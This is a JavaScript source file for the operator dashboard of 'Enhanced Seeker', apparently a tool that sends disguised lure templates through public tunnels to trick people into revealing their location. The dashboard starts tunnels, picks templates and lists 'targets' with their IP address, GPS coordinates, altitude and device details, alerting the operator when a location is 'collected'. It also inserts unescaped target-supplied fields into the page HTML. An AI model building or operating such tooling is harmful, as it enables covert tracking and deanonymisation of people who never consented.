/**
 * Enhanced Seeker Dashboard JavaScript
 * Real-time dashboard functionality with WebSocket support
 */

class SeekerDashboard {
    constructor() {
        this.socket = null;
        this.activeSessions = [];
        this.statistics = {};
        this.currentSection = 'overview';
        this.tunnelStatus = { active: false, url: null, service: null };
        
        this.init();
    }
    
    init() {
        this.initializeWebSocket();
        this.setupEventListeners();
        this.loadInitialData();
        this.setupAutoRefresh();
    }
    
    initializeWebSocket() {
        if (typeof io !== 'undefined') {
            this.socket = io();
            
            this.socket.on('connect', () => {
                console.log('Connected to Enhanced Seeker');
                this.showNotification('Connected to server', 'success');
            });
            
            this.socket.on('disconnect', () => {
                console.log('Disconnected from server');
                this.showNotification('Disconnected from server', 'warning');
            });
            
            this.socket.on('new_session', (data) => {
                this.handleNewSession(data);
            });
            
            this.socket.on('location_update', (data) => {
                this.handleLocationUpdate(data);
            });
        } else {
            console.warn('Socket.IO not available, falling back to polling');
            this.setupPolling();
        }
    }
    
    setupEventListeners() {
        // Navigation
        document.querySelectorAll('[data-section]').forEach(link => {
            link.addEventListener('click', (e) => {
                e.preventDefault();
                this.switchSection(e.target.dataset.section);
            });
        });
        
        // Tunnel management
        document.getElementById('start-tunnel')?.addEventListener('click', () => {
            this.startTunnel();
        });
        
        document.getElementById('stop-tunnel')?.addEventListener('click', () => {
            this.stopTunnel();
        });
        
        document.getElementById('copy-url')?.addEventListener('click', () => {
            this.copyTunnelUrl();
        });
        
        // Template selection
        document.querySelectorAll('.template-btn').forEach(btn => {
            btn.addEventListener('click', (e) => {
                this.selectTemplate(e.target.dataset.template);
            });
        });
        
        // Refresh button
        document.getElementById('refresh-data')?.addEventListener('click', () => {
            this.loadInitialData();
        });
    }
    
    loadInitialData() {
        this.loadStatistics();
        this.loadActiveSessions();
        this.checkTunnelStatus();
    }
    
    async loadStatistics() {
        try {
            const response = await fetch('/api/statistics');
            if (response.ok) {
                this.statistics = await response.json();
                this.updateStatisticsDisplay();
            }
        } catch (error) {
            console.error('Error loading statistics:', error);
            this.showNotification('Failed to load statistics', 'danger');
        }
    }
    
    async loadActiveSessions() {
        try {
            const response = await fetch('/api/sessions');
            if (response.ok) {
                this.activeSessions = await response.json();
                this.updateSessionsDisplay();
            }
        } catch (error) {
            console.error('Error loading sessions:', error);
            this.showNotification('Failed to load sessions', 'danger');
        }
    }
    
    async checkTunnelStatus() {
        try {
            const response = await fetch('/api/tunnel/status');
            if (response.ok) {
                this.tunnelStatus = await response.json();
                this.updateTunnelDisplay();
            }
        } catch (error) {
            console.error('Error checking tunnel status:', error);
        }
    }
    
    updateStatisticsDisplay() {
        const stats = this.statistics;
        
        // Update overview cards
        this.updateElement('total-sessions', stats.total_sessions || 0);
        this.updateElement('successful-collections', stats.successful_collections || 0);
        this.updateElement('success-rate', `${stats.success_rate || 0}%`);
        this.updateElement('avg-accuracy', `${stats.avg_accuracy || 0}m`);
        
        // Add visual indicators for success rate
        const successRateElement = document.getElementById('success-rate');
        if (successRateElement) {
            const rate = stats.success_rate || 0;
            const parentCard = successRateElement.closest('.card');
            if (parentCard) {
                parentCard.className = parentCard.className.replace(/bg-\w+/, '');
                if (rate >= 70) {
                    parentCard.classList.add('bg-success');
                } else if (rate >= 40) {
                    parentCard.classList.add('bg-warning');
                } else {
                    parentCard.classList.add('bg-danger');
                }
            }
        }
    }
    
    updateSessionsDisplay() {
        const tableBody = document.querySelector('#sessions-table tbody');
        if (!tableBody) return;
        
        if (this.activeSessions.length === 0) {
            tableBody.innerHTML = `
                <tr>
                    <td colspan="7" class="text-center py-5">
                        <i class="fas fa-users fa-3x text-muted mb-3"></i>
                        <h5 class="text-muted">No active sessions</h5>
                        <p class="text-muted">Sessions will appear here when targets interact with your templates.</p>
                    </td>
                </tr>
            `;
            return;
        }
        
        tableBody.innerHTML = this.activeSessions.map(session => {
            const location = session.location || {};
            const accuracy = location.accuracy;
            
            let accuracyBadge = '';
            if (accuracy) {
                if (accuracy < 50) {
                    accuracyBadge = `<span class="badge bg-success">${accuracy}m</span>`;
                } else if (accuracy < 100) {
                    accuracyBadge = `<span class="badge bg-warning">${accuracy}m</span>`;
                } else {
                    accuracyBadge = `<span class="badge bg-danger">${accuracy}m</span>`;
                }
            } else {
                accuracyBadge = '<span class="text-muted">N/A</span>';
            }
            
            const statusBadge = session.status === 'data_collected' 
                ? '<span class="badge bg-success">Data Collected</span>'
                : '<span class="badge bg-warning">Active</span>';
                
            const locationText = location.latitude && location.longitude
                ? `${location.latitude.toFixed(4)}, ${location.longitude.toFixed(4)}`
                : '<span class="text-muted">No location</span>';
            
            return `
                <tr data-session-id="${session.id}" class="fade-in">
                    <td><span class="badge bg-secondary">${session.id.substring(0, 8)}...</span></td>
                    <td>${session.ip}</td>
                    <td><span class="badge bg-primary">${session.template}</span></td>
                    <td>${statusBadge}</td>
                    <td>${locationText}</td>
                    <td>${accuracyBadge}</td>
                    <td>${this.formatTimestamp(session.timestamp)}</td>
                </tr>
            `;
        }).join('');
    }
    
    updateTunnelDisplay() {
        const statusElement = document.getElementById('tunnel-status');
        const urlInput = document.getElementById('tunnel-url');
        const startBtn = document.getElementById('start-tunnel');
        const stopBtn = document.getElementById('stop-tunnel');
        
        if (statusElement) {
            if (this.tunnelStatus.active) {
                statusElement.innerHTML = '<i class="fas fa-circle text-success"></i> Tunnel Active';
                statusElement.className = 'navbar-text tunnel-status active';
            } else {
                statusElement.innerHTML = '<i class="fas fa-circle text-danger"></i> Tunnel Inactive';
                statusElement.className = 'navbar-text tunnel-status inactive';
            }
        }
        
        if (urlInput) {
            urlInput.value = this.tunnelStatus.url || '';
        }
        
        if (startBtn && stopBtn) {
            if (this.tunnelStatus.active) {
                startBtn.disabled = true;
                stopBtn.disabled = false;
            } else {
                startBtn.disabled = false;
                stopBtn.disabled = true;
            }
        }
    }
    
    async startTunnel() {
        const service = document.getElementById('tunnel-service')?.value || 'ngrok';
        const startBtn = document.getElementById('start-tunnel');
        
        if (startBtn) {
            startBtn.disabled = true;
            startBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Starting...';
        }
        
        try {
            const response = await fetch(`/api/tunnel/start/${service}`, {
                method: 'GET'
            });
            
            const result = await response.json();
            
            if (result.status === 'success') {
                this.tunnelStatus = {
                    active: true,
                    url: result.url,
                    service: service
                };
                this.updateTunnelDisplay();
                this.showNotification(`Tunnel started: ${result.url}`, 'success');
            } else {
                throw new Error(result.message || 'Failed to start tunnel');
            }
        } catch (error) {
            console.error('Error starting tunnel:', error);
            this.showNotification(`Failed to start tunnel: ${error.message}`, 'danger');
        } finally {
            if (startBtn) {
                startBtn.disabled = false;
                startBtn.innerHTML = '<i class="fas fa-play"></i> Start Tunnel';
            }
        }
    }
    
    async stopTunnel() {
        const stopBtn = document.getElementById('stop-tunnel');
        
        if (stopBtn) {
            stopBtn.disabled = true;
            stopBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Stopping...';
        }
        
        try {
            const response = await fetch('/api/tunnel/stop', {
                method: 'GET'
            });
            
            const result = await response.json();
            
            if (result.status === 'success') {
                this.tunnelStatus = {
                    active: false,
                    url: null,
                    service: null
                };
                this.updateTunnelDisplay();
                this.showNotification('Tunnel stopped', 'info');
            } else {
                throw new Error(result.message || 'Failed to stop tunnel');
            }
        } catch (error) {
            console.error('Error stopping tunnel:', error);
            this.showNotification(`Failed to stop tunnel: ${error.message}`, 'danger');
        } finally {
            if (stopBtn) {
                stopBtn.disabled = true;
                stopBtn.innerHTML = '<i class="fas fa-stop"></i> Stop';
            }
        }
    }
    
    copyTunnelUrl() {
        const urlInput = document.getElementById('tunnel-url');
        if (urlInput && urlInput.value) {
            navigator.clipboard.writeText(urlInput.value).then(() => {
                this.showNotification('URL copied to clipboard', 'success');
            }).catch(() => {
                // Fallback for older browsers
                urlInput.select();
                document.execCommand('copy');
                this.showNotification('URL copied to clipboard', 'success');
            });
        }
    }
    
    async selectTemplate(template) {
        try {
            const response = await fetch(`/api/template/set/${template}`, {
                method: 'GET'
            });
            
            const result = await response.json();
            
            if (result.status === 'success') {
                // Update UI to show active template
                document.querySelectorAll('.template-btn').forEach(btn => {
                    btn.classList.remove('active');
                });
                
                document.querySelector(`[data-template="${template}"]`)?.classList.add('active');
                
                this.showNotification(`Template changed to: ${template}`, 'success');
            } else {
                throw new Error(result.message || 'Failed to set template');
            }
        } catch (error) {
            console.error('Error setting template:', error);
            this.showNotification(`Failed to set template: ${error.message}`, 'danger');
        }
    }
    
    switchSection(section) {
        // Hide all sections
        document.querySelectorAll('.content-section').forEach(sec => {
            sec.style.display = 'none';
        });
        
        // Show selected section
        const targetSection = document.getElementById(`${section}-section`);
        if (targetSection) {
            targetSection.style.display = 'block';
            this.currentSection = section;
        }
        
        // Update navigation
        document.querySelectorAll('[data-section]').forEach(link => {
            link.classList.remove('active');
        });
        
        document.querySelector(`[data-section="${section}"]`)?.classList.add('active');
    }
    
    handleNewSession(sessionData) {
        // Add to active sessions
        this.activeSessions.unshift(sessionData);
        
        // Limit to last 50 sessions
        if (this.activeSessions.length > 50) {
            this.activeSessions = this.activeSessions.slice(0, 50);
        }
        
        this.updateSessionsDisplay();
        this.showNotification(`New session from ${sessionData.ip}`, 'info');
        
        // Play notification sound (optional)
        this.playNotificationSound();
    }
    
    handleLocationUpdate(data) {
        // Find and update the session
        const sessionIndex = this.activeSessions.findIndex(s => s.id === data.session_id);
        if (sessionIndex !== -1) {
            this.activeSessions[sessionIndex] = {
                ...this.activeSessions[sessionIndex],
                ...data.data,
                status: 'data_collected'
            };
            
            this.updateSessionsDisplay();
            this.showLocationModal(data);
            this.showNotification(`Location collected from ${data.session_id.substring(0, 8)}...`, 'success');
        }
    }
    
    showLocationModal(data) {
        const modal = document.getElementById('locationModal');
        const detailsContainer = document.getElementById('location-details');
        
        if (modal && detailsContainer) {
            const location = data.data.location || {};
            const device = data.data.device || {};
            
            detailsContainer.innerHTML = `
                <div class="row">
                    <div class="col-md-6">
                        <h6><i class="fas fa-map-marker-alt"></i> Location Information</h6>
                        <table class="table table-sm">
                            <tr><td><strong>Latitude:</strong></td><td>${location.latitude || 'N/A'}</td></tr>
                            <tr><td><strong>Longitude:</strong></td><td>${location.longitude || 'N/A'}</td></tr>
                            <tr><td><strong>Accuracy:</strong></td><td>${location.accuracy || 'N/A'}m</td></tr>
                            <tr><td><strong>Altitude:</strong></td><td>${location.altitude || 'N/A'}m</td></tr>
                        </table>
                    </div>
                    <div class="col-md-6">
                        <h6><i class="fas fa-mobile-alt"></i> Device Information</h6>
                        <table class="table table-sm">
                            <tr><td><strong>IP Address:</strong></td><td>${device.ip_address || 'N/A'}</td></tr>
                            <tr><td><strong>User Agent:</strong></td><td title="${device.user_agent || ''}">${(device.user_agent || 'N/A').substring(0, 30)}...</td></tr>
                            <tr><td><strong>Platform:</strong></td><td>${device.parsed_ua?.os?.family || 'N/A'}</td></tr>
                            <tr><td><strong>Browser:</strong></td><td>${device.parsed_ua?.browser?.family || 'N/A'}</td></tr>
                        </table>
                    </div>
                </div>
            `;
            
            // Show modal using Bootstrap
            if (typeof bootstrap !== 'undefined') {
                new bootstrap.Modal(modal).show();
            }
        }
    }
    
    showNotification(message, type = 'info') {
        // Create notification element
        const notification = document.createElement('div');
        notification.className = `alert alert-${type} alert-dismissible fade show position-fixed`;
        notification.style.cssText = `
            top: 20px;
            right: 20px;
            z-index: 9999;
            min-width: 300px;
            max-width: 400px;
        `;
        
        notification.innerHTML = `
            ${message}
            <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
        `;
        
        document.body.appendChild(notification);
        
        // Auto-remove after 5 seconds
        setTimeout(() => {
            if (notification.parentNode) {
                notification.parentNode.removeChild(notification);
            }
        }, 5000);
    }
    
    playNotificationSound() {
        // Create and play a subtle notification sound
        if (typeof AudioContext !== 'undefined' || typeof webkitAudioContext !== 'undefined') {
            try {
                const audioContext = new (AudioContext || webkitAudioContext)();
                const oscillator = audioContext.createOscillator();
                const gainNode = audioContext.createGain();
                
                oscillator.connect(gainNode);
                gainNode.connect(audioContext.destination);
                
                oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
                oscillator.frequency.setValueAtTime(600, audioContext.currentTime + 0.1);
                
                gainNode.gain.setValueAtTime(0, audioContext.currentTime);
                gainNode.gain.linearRampToValueAtTime(0.1, audioContext.currentTime + 0.01);
                gainNode.gain.exponentialRampToValueAtTime(0.001, audioContext.currentTime + 0.3);
                
                oscillator.start(audioContext.currentTime);
                oscillator.stop(audioContext.currentTime + 0.3);
            } catch (error) {
                console.log('Could not play notification sound:', error);
            }
        }
    }
    
    setupPolling() {
        // Fallback polling for when WebSocket is not available
        setInterval(() => {
            this.loadActiveSessions();
        }, 5000);
        
        setInterval(() => {
            this.loadStatistics();
        }, 30000);
    }
    
    setupAutoRefresh() {
        // Auto-refresh statistics every 30 seconds
        setInterval(() => {
            this.loadStatistics();
        }, 30000);
        
        // Auto-refresh tunnel status every 60 seconds
        setInterval(() => {
            this.checkTunnelStatus();
        }, 60000);
    }
    
    updateElement(id, value) {
        const element = document.getElementById(id);
        if (element) {
            element.textContent = value;
        }
    }
    
    formatTimestamp(timestamp) {
        if (!timestamp) return 'N/A';
        
        const date = new Date(timestamp);
        const now = new Date();
        const diff = now - date;
        
        if (diff < 60000) { // Less than 1 minute
            return 'Just now';
        } else if (diff < 3600000) { // Less than 1 hour
            const minutes = Math.floor(diff / 60000);
            return `${minutes} minute${minutes > 1 ? 's' : ''} ago`;
        } else if (diff < 86400000) { // Less than 1 day
            const hours = Math.floor(diff / 3600000);
            return `${hours} hour${hours > 1 ? 's' : ''} ago`;
        } else {
            return date.toLocaleDateString() + ' ' + date.toLocaleTimeString();
        }
    }
}

// Initialize dashboard when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    window.seekerDashboard = new SeekerDashboard();
});

// Export for external access
if (typeof module !== 'undefined' && module.exports) {
    module.exports = SeekerDashboard;
}
